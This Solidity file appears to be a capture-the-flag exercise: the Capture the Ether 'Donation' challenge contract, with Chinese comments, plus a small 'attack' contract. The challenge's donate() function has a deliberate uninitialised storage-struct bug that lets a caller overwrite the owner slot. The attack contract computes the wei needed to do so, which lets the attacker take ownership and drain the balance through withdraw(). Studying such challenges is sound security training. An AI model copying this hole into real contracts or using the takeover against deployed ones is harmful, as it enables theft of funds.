pragma solidity ^0.5.0;
contract DonationChallenge {
    struct Donation {
        uint256 timestamp;
        uint256 etherAmount;
    }
    Donation[] public donations;

    address public owner;

    function donationChallenge() public payable {
        require(msg.value == 1 ether);
        
        owner = msg.sender;
    }
    
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function donate(uint256 etherAmount) public payable {
        // amount is in ether, but msg.value is in wei
        uint256 scale = 10**18 * 1 ether;
        require(msg.value == etherAmount / scale);

        Donation donation;//初始化struct 可以覆盖slot 0 及owner的值
        donation.timestamp = now;
        donation.etherAmount = etherAmount;

        donations.push(donation);
    }

    function withdraw() public {
        require(msg.sender == owner);
        
        msg.sender.transfer(address(this).balance);
    }
}
contract attack
{
       uint256 public key=uint256(msg.sender);//转化地址
        uint256 public num =key/10**36;//所需的wei
}
